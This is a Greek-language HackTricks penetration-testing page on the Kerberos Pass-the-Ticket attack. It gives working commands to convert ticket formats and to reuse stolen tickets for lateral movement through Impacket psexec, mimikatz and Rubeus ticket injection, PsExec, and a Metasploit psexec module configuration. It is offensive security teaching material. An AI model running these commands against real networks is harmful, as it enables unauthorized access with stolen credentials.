# Pass the Ticket

{{#include ../../banners/hacktricks-training.md}}

## Επισκόπηση

Σε μια επίθεση Pass-the-Ticket (PtT), ένας αντίπαλος χρησιμοποιεί ένα κλεμμένο Kerberos ticket για να πιστοποιηθεί ως το principal του ticket, χωρίς να έχει τον κωδικό πρόσβασης αυτού του λογαριασμού. Ένα ticket-granting ticket (TGT) μπορεί να χρησιμοποιηθεί για την αίτηση service tickets, ενώ ένα κλεμμένο service ticket περιορίζεται στην υπηρεσία-στόχο του και στη διάρκεια ισχύος του.<sup>[[1]](#references)</sup>

Για τεχνικές απόκτησης tickets, δείτε:

- [Συλλογή tickets από Windows](../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-windows.md)
- [Συλλογή tickets από Linux](../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-linux.md)

## Μετατροπή μορφών ticket σε Linux και Windows

Οι Kerberos caches εμφανίζονται συνήθως ως αρχεία MIT `ccache` σε Linux και ως αρχεία `.kirbi` σε Windows. Το `ticket_converter` μετατρέπει αυτές τις μορφές χρησιμοποιώντας ένα ticket εισόδου και μια διαδρομή εξόδου.<sup>[[2]](#references)</sup>

```bash
python ticket_converter.py velociraptor.ccache velociraptor.kirbi
# Expected message: Converting ccache => kirbi
python ticket_converter.py velociraptor.kirbi velociraptor.ccache
# Expected message: Converting kirbi => ccache
```

Το Kekeo παρέχει επίσης εργαλεία για Kerberos tickets στα Windows.<sup>[[3]](#references)</sup>

## Χρήση ενός ticket

Στο Linux, ορίστε το `KRB5CCNAME` ώστε να δείχνει στο cache και ρυθμίστε έναν client του Impacket να χρησιμοποιεί Kerberos χωρίς να ζητά κωδικό πρόσβασης:<sup>[[4]](#references)</sup>

```bash
export KRB5CCNAME=/root/impacket-examples/krb5cc_1120601113_ZFxZpK
python psexec.py jurassic.park/trex@labwws02.jurassic.park -k -no-pass
```

Στα Windows, τα Mimikatz ή Rubeus μπορούν να εισαγάγουν ένα ticket `.kirbi` στην τρέχουσα συνεδρία σύνδεσης. Χρησιμοποιήστε το `klist` για να ελέγξετε την cache που προκύπτει.<sup>[[5]](#references)[[6]](#references)</sup>

```powershell
mimikatz.exe "kerberos::ptt [0;28419fe]-2-1-40e00000-trex@krbtgt-JURASSIC.PARK.kirbi"
.\Rubeus.exe ptt /ticket:'[0;28419fe]-2-1-40e00000-trex@krbtgt-JURASSIC.PARK.kirbi'
klist
.\PsExec.exe -accepteula \\lab-wdc01.jurassic.park cmd
```

Η εισαγωγή ticket δεν παρέχει δικαιώματα πέρα από αυτά που αντιπροσωπεύει το ticket και την πολιτική εξουσιοδότησης της υπηρεσίας-στόχου. Τα ληγμένα, ανακληθέντα, κακοσχηματισμένα ή λανθασμένα περιορισμένα ticket μπορεί να μην λειτουργήσουν.<sup>[[1]](#references)</sup>

Για ευρύτερο πλαίσιο σχετικά με επιθέσεις Kerberos και συναφείς τεχνικές απόκτησης ticket, δείτε τον οδηγό επιθέσεων Kerberos της Tarlogic.<sup>[[7]](#references)</sup>

### Επαναχρησιμοποίηση εξωτερικού ticket στο Metasploit

Το Metasploit δεν διαβάζει αυτόματα το `KRB5CCNAME` του Impacket για τα Kerberos modules του. Δώστε στο module ένα **αρχείο ccache** μέσω της ειδικής για το πρωτόκολλο επιλογής `::Krb5Ccname`. Ορίστε το `::Rhostname` ως το SPN hostname του στόχου και το domain ως το domain του στόχου. Το `RHOST` μπορεί να παραμείνει η IP του στόχου. Έτσι, μπορείτε να χρησιμοποιήσετε ένα ticket που έχετε ήδη αποκτήσει χωρίς να εισαγάγετε τον κωδικό πρόσβασης του λογαριασμού.<sup>[[8]](#references)</sup>

Αν χρειάζεται, μετατρέψτε πρώτα το `.kirbi` σε ccache.<sup>[[9]](#references)</sup>

Για παράδειγμα, με ένα ticket για λογαριασμό που έχει δικαίωμα δημιουργίας υπηρεσιών στον στόχο, εκτελέστε το [SMB PsExec module](../lateral-movement/psexec-and-winexec.md) χρησιμοποιώντας αυτό το cache:<sup>[[8]](#references)[[9]](#references)[[10]](#references)</sup>

```text
use exploit/windows/smb/psexec
set RHOST 192.0.2.20
set SMBUser Administrator
set SMBDomain corp.example
set SMB::Auth kerberos
set SMB::Rhostname server.corp.example
set SMB::Krb5Ccname /path/to/administrator.ccache
set DomainControllerRhost 192.0.2.10
run
```

Το Metasploit επιλέγει πρώτα από την παρεχόμενη cache ένα service ticket που ταιριάζει. Αν βρει μόνο ένα TGT, ζητά ένα service ticket από τον KDC, επομένως και αυτή η διαδρομή απαιτεί σύνδεση με DC. Μια cache που περιέχει μόνο service ticket δεν παρέχει πρόσβαση σε άσχετους hosts. Για άλλα υποστηριζόμενα modules, αλλάξτε το πρόθεμα της επιλογής (για παράδειγμα, `Winrm::Krb5Ccname` για το [WinRM](../lateral-movement/winrm.md)).<sup>[[8]](#references)</sup>



## References

- [1] [MITRE ATT&CK T1550.003 - Pass the Ticket](https://attack.mitre.org/techniques/T1550/003/)
- [2] [Zer1t0 - `ticket_converter`](https://github.com/Zer1t0/ticket_converter)
- [3] [gentilkiwi - Kekeo](https://github.com/gentilkiwi/kekeo)
- [4] [Fortra - Παραδείγματα Impacket](https://github.com/fortra/impacket/tree/master/examples)
- [5] [gentilkiwi - Mimikatz](https://github.com/gentilkiwi/mimikatz)
- [6] [GhostPack - Rubeus](https://github.com/GhostPack/Rubeus)
- [7] [Tarlogic - Τεχνικές επιθέσεων Kerberos](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [8] [Metasploit - Αυθεντικοποίηση υπηρεσίας](https://docs.metasploit.com/docs/pentesting/active-directory/kerberos/service_authentication.html)
- [9] [Metasploit - Μετατροπή αρχείων kirbi και ccache](https://docs.metasploit.com/docs/pentesting/active-directory/kerberos/ticket_converter.html)
- [10] [Υλοποίηση Kerberos του SMB client του Metasploit](https://github.com/rapid7/metasploit-framework/blob/master/lib/msf/core/exploit/remote/smb/client.rb)
{{#include ../../banners/hacktricks-training.md}}
